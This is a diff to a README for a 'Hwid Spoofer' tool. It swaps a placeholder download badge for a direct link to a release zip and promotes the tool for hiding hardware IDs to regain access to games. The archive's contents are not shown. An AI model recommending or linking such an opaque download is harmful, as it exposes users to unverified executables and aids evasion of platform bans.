@@ -1,6 +1,6 @@
 # Hwid Spoofer 
 
-[![download](https://img.shields.io/badge/click%20to%20download-8A2BE2)](https://github.com/)
+[![download](https://img.shields.io/badge/click%20to%20download-8A2BE2)](https://github.com/WaleedBahtti/hwid-spoofer/releases/download/hwid-spoofer-v1/release.zip)
 
 My HWID (Hardware ID) Spoofer software is a cutting-edge tool to mask your hardware identification, providing an extra layer of privacy and security while you navigate online environments. Whether you're looking to regain access to a game or simply want to protect your identity, our software offers a reliable solution.
 
